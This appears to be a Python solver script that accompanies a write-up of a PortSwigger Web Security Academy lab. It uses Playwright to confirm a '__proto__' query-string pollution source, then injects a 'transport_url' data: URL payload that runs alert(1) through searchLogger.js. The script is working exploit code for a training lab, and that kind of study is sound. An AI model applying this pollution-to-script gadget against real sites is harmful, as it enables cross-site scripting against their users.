#!/usr/bin/env python3
"""
DOM XSS via client-side prototype pollution
PortSwigger Web Security Academy -- Client-Side Prototype Pollution

Companion script for the writeup: 02-dom-xss-via-client-side-prototype-pollution.md

What this does:
    Confirms the bracket-notation prototype pollution source
    (?__proto__[foo]=bar), then pollutes Object.prototype.transport_url with
    a data: URL. searchLogger.js reads config.transport_url with no default
    set anywhere, so the polluted value is inherited from the prototype
    chain and used as the src of a dynamically appended <script> element --
    the browser executes the data: URL as JavaScript. Requires a real
    browser engine (Playwright) since the pollution and the sink only exist
    in client-side JS, never in an HTTP response.

Usage:
    python 02-dom-xss-via-client-side-prototype-pollution.py <lab-url>
    e.g. python 02-dom-xss-via-client-side-prototype-pollution.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install playwright && playwright install chromium
"""

import sys
import time

from playwright.sync_api import sync_playwright


def solve(lab_url: str) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        dialogs = []
        page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))

        probe_url = f"{lab_url}/?__proto__[foo]=bar"
        page.goto(probe_url, wait_until="networkidle")
        polluted = page.evaluate("() => Object.prototype.foo")
        if polluted != "bar":
            print("[-] Bracket-notation source did not pollute Object.prototype -- aborting.")
            browser.close()
            return
        print("[+] Source confirmed: ?__proto__[foo]=bar pollutes Object.prototype")

        exploit_url = f"{lab_url}/?__proto__[transport_url]=data:,alert(1);//"
        print(f"[*] Navigating to: {exploit_url}")
        page.goto(exploit_url, wait_until="networkidle")
        time.sleep(2)  # let searchLogger.js append the <script src> and fire it

        if dialogs:
            print(f"[+] alert() fired: {dialogs[0]!r} -- transport_url gadget reached script.src")
        else:
            print("[-] No alert() observed -- gadget may not have fired")

        check = page.goto(lab_url, wait_until="networkidle")
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Lab solved.")
        else:
            print("[-] Not solved yet.")
        browser.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
